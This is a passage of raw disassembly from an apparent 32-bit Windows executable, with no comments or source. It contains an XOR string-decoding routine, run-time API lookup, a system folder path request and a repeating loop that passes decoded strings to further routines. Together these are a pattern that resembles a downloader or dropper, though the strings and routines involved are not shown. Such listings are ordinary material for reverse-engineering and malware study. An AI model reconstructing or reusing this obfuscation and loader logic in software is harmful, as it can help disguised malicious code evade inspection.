  40263a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40263d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402640:	39 c8                	cmp    %ecx,%eax
  402642:	0f 8d 4c 00 00 00    	jge    0x402694
  402648:	e9 0d 00 00 00       	jmp    0x40265a
  40264d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402650:	89 c1                	mov    %eax,%ecx
  402652:	83 c0 01             	add    $0x1,%eax
  402655:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402658:	eb e0                	jmp    0x40263a
  40265a:	8b 45 08             	mov    0x8(%ebp),%eax
  40265d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402660:	01 c8                	add    %ecx,%eax
  402662:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402665:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402668:	01 d1                	add    %edx,%ecx
  40266a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40266d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402670:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  402673:	b9 07 00 00 00       	mov    $0x7,%ecx
  402678:	99                   	cltd
  402679:	f7 f9                	idiv   %ecx
  40267b:	c1 e2 02             	shl    $0x2,%edx
  40267e:	8b 45 10             	mov    0x10(%ebp),%eax
  402681:	01 d0                	add    %edx,%eax
  402683:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402686:	0f be 09             	movsbl (%ecx),%ecx
  402689:	8b 10                	mov    (%eax),%edx
  40268b:	31 d1                	xor    %edx,%ecx
  40268d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402690:	88 08                	mov    %cl,(%eax)
  402692:	eb b9                	jmp    0x40264d
  402694:	c9                   	leave
  402695:	c3                   	ret
  402696:	55                   	push   %ebp
  402697:	89 e5                	mov    %esp,%ebp
  402699:	81 ec 18 03 00 00    	sub    $0x318,%esp
  40269f:	90                   	nop
  4026a0:	b8 00 00 00 00       	mov    $0x0,%eax
  4026a5:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4026a8:	b8 00 00 00 00       	mov    $0x0,%eax
  4026ad:	88 85 f5 fe ff ff    	mov    %al,-0x10b(%ebp)
  4026b3:	b8 fe 00 00 00       	mov    $0xfe,%eax
  4026b8:	50                   	push   %eax
  4026b9:	b8 00 00 00 00       	mov    $0x0,%eax
  4026be:	50                   	push   %eax
  4026bf:	8d 85 f6 fe ff ff    	lea    -0x10a(%ebp),%eax
  4026c5:	50                   	push   %eax
  4026c6:	e8 9d 02 00 00       	call   0x402968
  4026cb:	83 c4 0c             	add    $0xc,%esp
  4026ce:	b8 00 00 00 00       	mov    $0x0,%eax
  4026d3:	88 85 f5 fc ff ff    	mov    %al,-0x30b(%ebp)
  4026d9:	b8 ff 01 00 00       	mov    $0x1ff,%eax
  4026de:	50                   	push   %eax
  4026df:	b8 00 00 00 00       	mov    $0x0,%eax
  4026e4:	50                   	push   %eax
  4026e5:	8d 85 f6 fc ff ff    	lea    -0x30a(%ebp),%eax
  4026eb:	50                   	push   %eax
  4026ec:	e8 77 02 00 00       	call   0x402968
  4026f1:	83 c4 0c             	add    $0xc,%esp
  4026f4:	b8 00 00 00 00       	mov    $0x0,%eax
  4026f9:	89 85 f0 fc ff ff    	mov    %eax,-0x310(%ebp)
  4026ff:	b8 00 00 00 00       	mov    $0x0,%eax
  402704:	89 85 ec fc ff ff    	mov    %eax,-0x314(%ebp)
  40270a:	e9 18 00 00 00       	jmp    0x402727
  40270f:	b8 98 33 40 00       	mov    $0x403398,%eax
  402714:	50                   	push   %eax
  402715:	e8 f3 fd ff ff       	call   0x40250d
  40271a:	83 c4 04             	add    $0x4,%esp
  40271d:	b8 01 00 00 00       	mov    $0x1,%eax
  402722:	e9 ab 01 00 00       	jmp    0x4028d2
  402727:	b8 76 1a 40 00       	mov    $0x401a76,%eax
  40272c:	50                   	push   %eax
  40272d:	e8 f6 02 00 00       	call   0x402a28
  402732:	e8 68 f3 ff ff       	call   0x401a9f
  402737:	85 c0                	test   %eax,%eax
  402739:	0f 84 0a 00 00 00    	je     0x402749
  40273f:	b8 00 00 00 00       	mov    $0x0,%eax
  402744:	e9 89 01 00 00       	jmp    0x4028d2
  402749:	e8 0c f4 ff ff       	call   0x401b5a
  40274e:	83 f8 20             	cmp    $0x20,%eax
  402751:	b8 00 00 00 00       	mov    $0x0,%eax
  402756:	0f 94 c0             	sete   %al
  402759:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40275c:	b8 ac 33 40 00       	mov    $0x4033ac,%eax
  402761:	50                   	push   %eax
  402762:	e8 f1 01 00 00       	call   0x402958
  402767:	b9 b7 33 40 00       	mov    $0x4033b7,%ecx
  40276c:	51                   	push   %ecx
  40276d:	50                   	push   %eax
  40276e:	e8 ed 01 00 00       	call   0x402960
  402773:	89 85 e8 fc ff ff    	mov    %eax,-0x318(%ebp)
  402779:	b8 c1 33 40 00       	mov    $0x4033c1,%eax
  40277e:	50                   	push   %eax
  40277f:	e8 d4 01 00 00       	call   0x402958
  402784:	b9 cd 33 40 00       	mov    $0x4033cd,%ecx
  402789:	51                   	push   %ecx
  40278a:	50                   	push   %eax
  40278b:	e8 d0 01 00 00       	call   0x402960
  402790:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402793:	b8 00 00 00 00       	mov    $0x0,%eax
  402798:	50                   	push   %eax
  402799:	b8 1a 00 00 00       	mov    $0x1a,%eax
  40279e:	50                   	push   %eax
  40279f:	8d 85 f5 fe ff ff    	lea    -0x10b(%ebp),%eax
  4027a5:	50                   	push   %eax
  4027a6:	b8 00 00 00 00       	mov    $0x0,%eax
  4027ab:	50                   	push   %eax
  4027ac:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4027af:	ff d0                	call   *%eax
  4027b1:	8d 85 f5 fe ff ff    	lea    -0x10b(%ebp),%eax
  4027b7:	50                   	push   %eax
  4027b8:	b8 e5 33 40 00       	mov    $0x4033e5,%eax
  4027bd:	50                   	push   %eax
  4027be:	8d 85 f5 fc ff ff    	lea    -0x30b(%ebp),%eax
  4027c4:	50                   	push   %eax
  4027c5:	8b 85 e8 fc ff ff    	mov    -0x318(%ebp),%eax
  4027cb:	ff d0                	call   *%eax
  4027cd:	8d 85 f5 fc ff ff    	lea    -0x30b(%ebp),%eax
  4027d3:	50                   	push   %eax
  4027d4:	e8 d1 f9 ff ff       	call   0x4021aa
  4027d9:	83 c4 04             	add    $0x4,%esp
  4027dc:	89 85 ec fc ff ff    	mov    %eax,-0x314(%ebp)
  4027e2:	8b 85 ec fc ff ff    	mov    -0x314(%ebp),%eax
  4027e8:	83 f8 00             	cmp    $0x0,%eax
  4027eb:	0f 85 a8 00 00 00    	jne    0x402899
  4027f1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4027f4:	85 c0                	test   %eax,%eax
  4027f6:	0f 84 3b 00 00 00    	je     0x402837
  4027fc:	b8 7c 33 40 00       	mov    $0x40337c,%eax
  402801:	50                   	push   %eax
  402802:	b8 1c 00 00 00       	mov    $0x1c,%eax
  402807:	50                   	push   %eax
  402808:	b8 40 33 40 00       	mov    $0x403340,%eax
  40280d:	50                   	push   %eax
  40280e:	e8 15 fe ff ff       	call   0x402628
  402813:	83 c4 0c             	add    $0xc,%esp
  402816:	8d 85 ec fc ff ff    	lea    -0x314(%ebp),%eax
  40281c:	50                   	push   %eax
  40281d:	8d 85 f0 fc ff ff    	lea    -0x310(%ebp),%eax
  402823:	50                   	push   %eax
  402824:	b8 40 33 40 00       	mov    $0x403340,%eax
  402829:	50                   	push   %eax
  40282a:	e8 db f3 ff ff       	call   0x401c0a
  40282f:	83 c4 0c             	add    $0xc,%esp
  402832:	e9 36 00 00 00       	jmp    0x40286d
  402837:	b8 7c 33 40 00       	mov    $0x40337c,%eax
  40283c:	50                   	push   %eax
  40283d:	b8 1c 00 00 00       	mov    $0x1c,%eax
  402842:	50                   	push   %eax
  402843:	b8 5d 33 40 00       	mov    $0x40335d,%eax
  402848:	50                   	push   %eax
  402849:	e8 da fd ff ff       	call   0x402628
  40284e:	83 c4 0c             	add    $0xc,%esp
  402851:	8d 85 ec fc ff ff    	lea    -0x314(%ebp),%eax
  402857:	50                   	push   %eax
  402858:	8d 85 f0 fc ff ff    	lea    -0x310(%ebp),%eax
  40285e:	50                   	push   %eax
  40285f:	b8 5d 33 40 00       	mov    $0x40335d,%eax
  402864:	50                   	push   %eax
  402865:	e8 a0 f3 ff ff       	call   0x401c0a
  40286a:	83 c4 0c             	add    $0xc,%esp
  40286d:	8b 85 ec fc ff ff    	mov    -0x314(%ebp),%eax
  402873:	83 f8 00             	cmp    $0x0,%eax
  402876:	0f 84 1d 00 00 00    	je     0x402899
  40287c:	8d 85 f5 fc ff ff    	lea    -0x30b(%ebp),%eax
  402882:	50                   	push   %eax
  402883:	8b 85 ec fc ff ff    	mov    -0x314(%ebp),%eax
  402889:	50                   	push   %eax
  40288a:	8b 85 f0 fc ff ff    	mov    -0x310(%ebp),%eax
  402890:	50                   	push   %eax
  402891:	e8 11 fd ff ff       	call   0x4025a7
  402896:	83 c4 0c             	add    $0xc,%esp
  402899:	8b 85 ec fc ff ff    	mov    -0x314(%ebp),%eax
  40289f:	83 f8 00             	cmp    $0x0,%eax
  4028a2:	0f 84 1b 00 00 00    	je     0x4028c3
  4028a8:	8d 85 f5 fc ff ff    	lea    -0x30b(%ebp),%eax
  4028ae:	50                   	push   %eax
  4028af:	b8 4e 34 40 00       	mov    $0x40344e,%eax
  4028b4:	50                   	push   %eax
  4028b5:	b8 f6 33 40 00       	mov    $0x4033f6,%eax
  4028ba:	50                   	push   %eax
  4028bb:	e8 00 ec ff ff       	call   0x4014c0
  4028c0:	83 c4 0c             	add    $0xc,%esp
  4028c3:	e9 47 fe ff ff       	jmp    0x40270f
  4028c8:	b8 00 00 00 00       	mov    $0x0,%eax
  4028cd:	e9 00 00 00 00       	jmp    0x4028d2
  4028d2:	c9                   	leave
  4028d3:	c3                   	ret
	...
  4028e0:	55                   	push   %ebp
  4028e1:	89 e5                	mov    %esp,%ebp
  4028e3:	81 ec 14 00 00 00    	sub    $0x14,%esp
  4028e9:	90                   	nop
  4028ea:	b8 00 00 00 00       	mov    $0x0,%eax
  4028ef:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4028f2:	b8 00 00 03 00       	mov    $0x30000,%eax
  4028f7:	50                   	push   %eax
  4028f8:	b8 00 00 01 00       	mov    $0x10000,%eax
  4028fd:	50                   	push   %eax
  4028fe:	e8 2d 01 00 00       	call   0x402a30
  402903:	83 c4 08             	add    $0x8,%esp
  402906:	b8 01 00 00 00       	mov    $0x1,%eax
  40290b:	50                   	push   %eax
  40290c:	e8 27 01 00 00       	call   0x402a38
  402911:	83 c4 04             	add    $0x4,%esp
  402914:	8d 45 ec             	lea    -0x14(%ebp),%eax
  402917:	50                   	push   %eax
  402918:	b8 00 00 00 00       	mov    $0x0,%eax
  40291d:	50                   	push   %eax
  40291e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402921:	50                   	push   %eax
  402922:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402925:	50                   	push   %eax
  402926:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402929:	50                   	push   %eax
  40292a:	e8 11 01 00 00       	call   0x402a40
  40292f:	83 c4 14             	add    $0x14,%esp
  402932:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402935:	50                   	push   %eax
  402936:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402939:	50                   	push   %eax
  40293a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40293d:	50                   	push   %eax
  40293e:	e8 53 fd ff ff       	call   0x402696
  402943:	83 c4 0c             	add    $0xc,%esp
  402946:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402949:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40294c:	50                   	push   %eax
  40294d:	e8 f6 00 00 00       	call   0x402a48
  402952:	83 c4 04             	add    $0x4,%esp
  402955:	c9                   	leave
  402956:	c3                   	ret
  402957:	00 ff                	add    %bh,%bh
  402959:	25 bc 34 40 00       	and    $0x4034bc,%eax
  40295e:	00 00                	add    %al,(%eax)
  402960:	ff 25 c0 34 40 00    	jmp    *0x4034c0
  402966:	00 00                	add    %al,(%eax)
  402968:	ff 25 0c 35 40 00    	jmp    *0x40350c
  40296e:	00 00                	add    %al,(%eax)
  402970:	ff 25 c4 34 40 00    	jmp    *0x4034c4
  402976:	00 00                	add    %al,(%eax)
  402978:	ff 25 c8 34 40 00    	jmp    *0x4034c8
  40297e:	00 00                	add    %al,(%eax)
  402980:	ff 25 10 35 40 00    	jmp    *0x403510
  402986:	00 00                	add    %al,(%eax)
  402988:	ff 25 cc 34 40 00    	jmp    *0x4034cc
  40298e:	00 00                	add    %al,(%eax)
  402990:	ff 25 d0 34 40 00    	jmp    *0x4034d0
  402996:	00 00                	add    %al,(%eax)
  402998:	ff 25 14 35 40 00    	jmp    *0x403514
  40299e:	00 00                	add    %al,(%eax)
  4029a0:	ff 25 d4 34 40 00    	jmp    *0x4034d4
  4029a6:	00 00                	add    %al,(%eax)
  4029a8:	ff 25 18 35 40 00    	jmp    *0x403518
  4029ae:	00 00                	add    %al,(%eax)
  4029b0:	ff 25 1c 35 40 00    	jmp    *0x40351c
  4029b6:	00 00                	add    %al,(%eax)
  4029b8:	ff 25 20 35 40 00    	jmp    *0x403520
  4029be:	00 00                	add    %al,(%eax)
  4029c0:	ff 25 d8 34 40 00    	jmp    *0x4034d8
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	ff 25 dc 34 40 00    	jmp    *0x4034dc
  4029ce:	00 00                	add    %al,(%eax)
  4029d0:	ff 25 e0 34 40 00    	jmp    *0x4034e0
  4029d6:	00 00                	add    %al,(%eax)
  4029d8:	ff 25 e4 34 40 00    	jmp    *0x4034e4
  4029de:	00 00                	add    %al,(%eax)
  4029e0:	ff 25 e8 34 40 00    	jmp    *0x4034e8
  4029e6:	00 00                	add    %al,(%eax)
  4029e8:	ff 25 24 35 40 00    	jmp    *0x403524
  4029ee:	00 00                	add    %al,(%eax)
  4029f0:	ff 25 28 35 40 00    	jmp    *0x403528
  4029f6:	00 00                	add    %al,(%eax)
  4029f8:	ff 25 ec 34 40 00    	jmp    *0x4034ec
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	ff 25 f0 34 40 00    	jmp    *0x4034f0
  402a06:	00 00                	add    %al,(%eax)
  402a08:	ff 25 f4 34 40 00    	jmp    *0x4034f4
  402a0e:	00 00                	add    %al,(%eax)
  402a10:	ff 25 f8 34 40 00    	jmp    *0x4034f8
  402a16:	00 00                	add    %al,(%eax)
  402a18:	ff 25 fc 34 40 00    	jmp    *0x4034fc
  402a1e:	00 00                	add    %al,(%eax)
  402a20:	ff 25 00 35 40 00    	jmp    *0x403500
  402a26:	00 00                	add    %al,(%eax)
  402a28:	ff 25 04 35 40 00    	jmp    *0x403504
  402a2e:	00 00                	add    %al,(%eax)
  402a30:	ff 25 2c 35 40 00    	jmp    *0x40352c
  402a36:	00 00                	add    %al,(%eax)
  402a38:	ff 25 30 35 40 00    	jmp    *0x403530
  402a3e:	00 00                	add    %al,(%eax)
  402a40:	ff 25 34 35 40 00    	jmp    *0x403534
  402a46:	00 00                	add    %al,(%eax)
  402a48:	ff 25 38 35 40 00    	jmp    *0x403538
	...
